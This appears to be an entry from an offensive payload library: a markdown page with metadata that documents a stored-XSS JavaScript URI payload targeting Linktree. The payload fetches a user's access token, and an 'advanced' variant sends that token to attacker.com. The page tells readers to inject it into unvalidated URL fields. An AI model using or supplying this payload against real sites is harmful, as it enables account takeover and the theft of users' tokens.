---
data: >-
  javascript://https://amazon.com/shop/x%0Aeval("(async()=>{await+fetch('https://linktr.ee/api/token').then((response)=>response.json()).then((responseJson)=>{alert(responseJson['accessToken']);})})()")
tags:
  - xss
  - payload
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:38.281Z'
id: 2d5be29d-c3d4-43e9-88dc-215b4867a3d4
verified: false
validated: true
submitted: true
---
# javascript-uri-xss-payload

## Command

```javascript
javascript://https://amazon.com/shop/x%0Aeval("(async()=>{await+fetch('https://linktr.ee/api/token').then((response)=>response.json()).then((responseJson)=>{alert(responseJson['accessToken']);})})()")
```

## Description

This JavaScript URI payload is injected into URL fields to trigger stored XSS, executing code that fetches and alerts the access token from Linktree's API. Use in unvalidated inputs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | URI scheme with embedded eval | Yes |
| fetch URL | Internal API endpoint | Yes |
| alert | Displays token for POC | No (replace for exfil) |

## Examples

### Basic Usage

```javascript
javascript://https://amazon.com/shop/x%0Aeval("(async()=>{await+fetch('https://linktr.ee/api/token').then((response)=>response.json()).then((responseJson)=>{alert(responseJson['accessToken']);})})()")
```

### Advanced Usage

```javascript
// With exfil instead of alert
javascript://...eval("...then((responseJson)=>{fetch('https://attacker.com?token='+responseJson['accessToken']);})")
```

## Expected Output

Upon rendering, an alert popup displays the accessToken from the JSON response.

## Related

- [[commands/fetch-access-token-exfil]]
- [[procedures/Craft-Malicious-JavaScript-URI-Payload]]
